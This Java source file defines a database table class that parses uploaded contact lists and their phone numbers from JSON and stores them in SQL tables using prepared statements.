package com.theah64.xrob.api.database.tables;

import com.sun.istack.internal.NotNull;
import com.sun.istack.internal.Nullable;
import com.theah64.xrob.api.database.Connection;
import com.theah64.xrob.api.models.Contact;
import com.theah64.xrob.api.models.PhoneNumber;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by theapache64 on 4/9/16,11:39 AM.
 */
public class Contacts extends BaseTable<Contact> {

    private static final String COLUMN_PHONE_NUMBER = "phone_number";
    private static final String COLUMN_PHONE_TYPE = "phone_type";
    private static final String COLUMN_USER_ID = "user_id";
    private static final String KEY_PHONE_NUMBERS = "phone_numbers";
    private static Contacts instance = new Contacts();

    private Contacts() {
    }

    public static Contacts getInstance() {
        return instance;
    }

    protected boolean isPhoneNumberExist(PhoneNumber phoneNumber) {

        boolean isExist = false;
        final String query = "SELECT id FROM phone_numbers WHERE contact_id = ? AND phone = ? AND phone_type = ? LIMIT 1";
        final java.sql.Connection con = Connection.getConnection();

        try {
            final PreparedStatement ps = con.prepareStatement(query);

            ps.setString(1, phoneNumber.getContactId());
            ps.setString(2, phoneNumber.getPhoneNumber());
            ps.setString(3, phoneNumber.getType());

            final ResultSet rs = ps.executeQuery();
            isExist = rs.first();
            System.out.println("isPhoneNumberExist : " + isExist + ", Contact : " + phoneNumber);
            rs.close();
            ps.close();

        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
        return isExist;
    }

    @Override
    protected List<Contact> parse(@Nullable String userId, @NotNull JSONArray jaContacts) throws JSONException {

        final List<Contact> contactList = new ArrayList<>();

        for (int i = 0; i < jaContacts.length(); i++) {

            final JSONObject joContact = jaContacts.getJSONObject(i);

            final String name = joContact.getString(COLUMN_NAME);

            final JSONArray jaPhoneNumbers = joContact.getJSONArray(KEY_PHONE_NUMBERS);
            final List<PhoneNumber> phoneNumbers = parsePhoneNumbers(null, jaPhoneNumbers);
            contactList.add(new Contact(userId, null, name, phoneNumbers));

        }

        return contactList;
    }

    /**
     * Used parse phone numbers and their types from the JSONArray received via JSONPOSTServlet.
     */
    private List<PhoneNumber> parsePhoneNumbers(final String contactId, JSONArray jaPhoneNumbers) {

        if (jaPhoneNumbers != null) {

            final List<PhoneNumber> phoneNumbers = new ArrayList<>(jaPhoneNumbers.length());

            try {

                for (int i = 0; i < jaPhoneNumbers.length(); i++) {
                    final JSONObject jaPhoneNumber = jaPhoneNumbers.getJSONObject(i);
                    final String phoneNumber = jaPhoneNumber.getString(COLUMN_PHONE_NUMBER);
                    final String phoneType = jaPhoneNumber.getString(COLUMN_PHONE_TYPE);
                    phoneNumbers.add(new PhoneNumber(contactId, phoneNumber, phoneType));
                }

                return phoneNumbers;

            } catch (JSONException e) {
                e.printStackTrace();
            }

        }
        return null;
    }

    @Override
    public Contact get(String column1, String value1, String column2, String value2) {
        Contact contact = null;
        final String query = String.format("SELECT id FROM contacts WHERE %s = ? AND %s = ? LIMIT 1", column1, column2);
        final java.sql.Connection con = Connection.getConnection();
        try {
            final PreparedStatement ps = con.prepareStatement(query);

            ps.setString(1, value1);
            ps.setString(2, value2);

            final ResultSet rs = ps.executeQuery();

            if (rs.first()) {
                final String id = rs.getString(COLUMN_ID);
                contact = new Contact(null, id, null, null);
            }

            rs.close();
            ps.close();

        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
        return contact;
    }

    /**
     * Adding contacts from JSONArray
     *
     * @param userId
     * @param jsonArray
     * @throws RuntimeException
     * @throws JSONException
     */
    @Override
    public void addv2(@Nullable String userId, @NotNull JSONArray jsonArray) throws RuntimeException, JSONException {

        boolean isAdded = true;
        //Preparing list
        final List<Contact> contactList = parse(userId, jsonArray);

        final String insertContactQuery = "INSERT INTO contacts (user_id, name) VALUES (?,?);";

        final java.sql.Connection con = Connection.getConnection();

        try {
            final PreparedStatement psAddContact = con.prepareStatement(insertContactQuery, PreparedStatement.RETURN_GENERATED_KEYS);
            psAddContact.setString(1, userId);

            for (final Contact contact : contactList) {

                String contactId = null;
                final Contact exContact = get(Contacts.COLUMN_USER_ID, userId, Contacts.COLUMN_NAME, contact.getName());

                if (exContact == null) {

                    //Adding new contact
                    psAddContact.setString(2, contact.getName());
                    isAdded = isAdded && psAddContact.executeUpdate() == 1;

                    if (isAdded) {
                        final ResultSet genRs = psAddContact.getGeneratedKeys();
                        if (genRs.first()) {
                            contactId = genRs.getString(1);
                        }
                        genRs.close();
                    }

                } else {
                    contactId = exContact.getId();
                }


                if (contactId != null) {

                    if (contact.getPhone() != null && contact.getPhone().size() > 0) {

                        final String insertPhoneNumberQuery = "INSERT INTO phone_numbers (contact_id, phone,phone_type) VALUES (?,?,?);";
                        final PreparedStatement ps = con.prepareStatement(insertPhoneNumberQuery);

                        //Looping through each phone number and add it to the database.
                        for (final PhoneNumber phoneNumber : contact.getPhone()) {

                            //Setting phone number's contact id
                            phoneNumber.setContactId(contactId);

                            if (!isPhoneNumberExist(phoneNumber)) {

                                ps.setString(1, phoneNumber.getContactId());
                                ps.setString(2, phoneNumber.getPhoneNumber());
                                ps.setString(3, phoneNumber.getType());

                                isAdded = isAdded && ps.executeUpdate() == 1;
                            }

                        }

                        ps.close();

                    }
                }


            }


        } catch (SQLException e) {
            e.printStackTrace();
            isAdded = false;
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

        if (!isAdded) {
            throw new RuntimeException("Error occured while adding contacts to database");
        }

    }


}
